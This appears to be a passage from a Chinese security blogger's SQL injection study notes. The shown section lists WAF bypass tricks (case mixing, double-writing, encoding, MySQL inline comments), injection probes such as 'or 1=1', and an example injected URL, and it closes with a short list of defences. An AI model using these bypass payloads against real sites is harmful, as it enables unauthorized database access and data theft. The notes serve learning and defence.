+<h1 id="额外知识"><a href="#额外知识" class="headerlink" title="额外知识"></a>额外知识</h1><h2 id="sql注入几种绕过"><a href="#sql注入几种绕过" class="headerlink" title="sql注入几种绕过"></a>sql注入几种绕过</h2><ol>
+<li><p>当屏蔽group_concat时,用<code>concat(table_name)</code> 或者直接就<code>table_name</code>，然后使用<code>limit</code>获取我们需要的信息</p>
+</li>
+<li><p>当输出时,观察后面部分,在我们构造的order by之后还有一个order by,我们应该把它注释掉<br><img src="https://images.atsud0.me/images/post/Screenshot_20200510_143304.jpg" alt="sd"></p>
+</li>
+</ol>
+<p>正确的方式:<code>http://111/english/gallery.php?cid=1%20order%20by%2015%20--+</code></p>
+<h2 id="过WAF"><a href="#过WAF" class="headerlink" title="过WAF"></a>过WAF</h2><p>先尝试关键词会不会被截断,要用好内联注释</p>
+<p>双写<br>大小写 uNIon Select<br>使用编码 ‰55nion %53elect 1,2,3,4<br>使用注释<br>特殊符号</p>
+<h2 id="注释方式"><a href="#注释方式" class="headerlink" title="注释方式"></a>注释方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- 注意后面有空格</span><br><span class="line">&#x2F;* *&#x2F;</span><br><span class="line">&#x2F;*! *&#x2F;注释完整的单词,不能注释部分的单词,绕过一些过滤(不是注释的注释)(不能真的算是注释,但是能用于过waf)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在mysql中 <code>/*! ....*/</code> 不是注释，<code>mysql</code>为了保持兼容，它把一些特有的仅在<code>mysql</code>上用的语句放在/<code>*!....*/</code>中，这样这些语句如果在其他数据库中是不会被执行，但在<code>mysql</code>中它会执行。</p>
+</blockquote>
+<h2 id="引号闭合"><a href="#引号闭合" class="headerlink" title="引号闭合"></a>引号闭合</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号中插入双引号不会报错,不影响执行,但是数字型和双引号中插入双引号会报错...</span><br><span class="line"></span><br><span class="line">双引号中插入单引号不会报错,不影响执行,但是数字型和单引号中插入单引号会报错...</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br><span class="line">and 1&#x3D;1</span><br><span class="line">or 1&#x3D;1</span><br><span class="line">xor 1&#x3D;2</span><br><span class="line">like 1</span><br></pre></td></tr></table></figure>
+
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">魔术引号</span><br><span class="line">过滤函数（严格过滤用户的输入</span><br><span class="line">WAF</span><br><span class="line">PDO预处理</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/05/15/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" title="sql注入笔记">http://atsud0.me/2020/05/15/sql注入笔记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/sql-injection/" rel="tag"><i class="fa fa-tag"></i> sql_injection</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/15/sqlmap%E7%AC%94%E8%AE%B0/" rel="prev" title="sqlmap学习笔记">
+      <i class="fa fa-chevron-left"></i> sqlmap学习笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/05/15/smb%E7%AC%94%E8%AE%B0/" rel="next" title="smb笔记">
+      smb笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入原理"><span class="nav-number">1.</span> <span class="nav-text">SQL注入原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#information-schema"><span class="nav-number">2.</span> <span class="nav-text">information_schema</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#联合注入"><span class="nav-number">3.</span> <span class="nav-text">联合注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#报错注入"><span class="nav-number">4.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#extractvalue"><span class="nav-number">4.1.</span> <span class="nav-text">extractvalue()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#updatexml"><span class="nav-number">4.2.</span> <span class="nav-text">updatexml()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#floor"><span class="nav-number">4.3.</span> <span class="nav-text">floor()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入步骤"><span class="nav-number">4.4.</span> <span class="nav-text">报错注入步骤</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#布尔注入"><span class="nav-number">5.</span> <span class="nav-text">布尔注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#布尔注入步骤"><span class="nav-number">5.1.</span> <span class="nav-text">布尔注入步骤</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#时间延迟注入"><span class="nav-number">6.</span> <span class="nav-text">时间延迟注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sleep"><span class="nav-number">6.1.</span> <span class="nav-text">sleep</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#benchmark"><span class="nav-number">6.2.</span> <span class="nav-text">benchmark</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#宽字节注入"><span class="nav-number">7.</span> <span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#字符编码集"><span class="nav-number">7.1.</span> <span class="nav-text">字符编码集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URL编码"><span class="nav-number">7.2.</span> <span class="nav-text">URL编码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入原理"><span class="nav-number">7.3.</span> <span class="nav-text">宽字节注入原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入防御方式"><span class="nav-number">7.4.</span> <span class="nav-text">宽字节注入防御方式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二次解码注入"><span class="nav-number">8.</span> <span class="nav-text">二次解码注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二次注入-存储型注入"><span class="nav-number">9.</span> <span class="nav-text">二次注入(存储型注入)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#堆叠注入"><span class="nav-number">10.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DNS-log注入"><span class="nav-number">11.</span> <span class="nav-text">DNS log注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基于http头部的SQL注入"><span class="nav-number">12.</span> <span class="nav-text">基于http头部的SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie"><span class="nav-number">12.1.</span> <span class="nav-text">cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#referer"><span class="nav-number">12.2.</span> <span class="nav-text">referer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#user-agent"><span class="nav-number">12.3.</span> <span class="nav-text">user-agent</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Mysql文件读写"><span class="nav-number">13.</span> <span class="nav-text">Mysql文件读写</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#写"><span class="nav-number">13.1.</span> <span class="nav-text">写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读"><span class="nav-number">13.2.</span> <span class="nav-text">读</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#万能密码"><span class="nav-number">14.</span> <span class="nav-text">万能密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#死活爆破不出列名，只知道表名，要怎么进行注入"><span class="nav-number">15.</span> <span class="nav-text">死活爆破不出列名，只知道表名，要怎么进行注入?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#额外知识"><span class="nav-number">16.</span> <span class="nav-text">额外知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入几种绕过"><span class="nav-number">16.1.</span> <span class="nav-text">sql注入几种绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过WAF"><span class="nav-number">16.2.</span> <span class="nav-text">过WAF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注释方式"><span class="nav-number">16.3.</span> <span class="nav-text">注释方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#引号闭合"><span class="nav-number">16.4.</span> <span class="nav-text">引号闭合</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断注入"><span class="nav-number">16.5.</span> <span class="nav-text">判断注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御"><span class="nav-number">16.6.</span> <span class="nav-text">防御</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
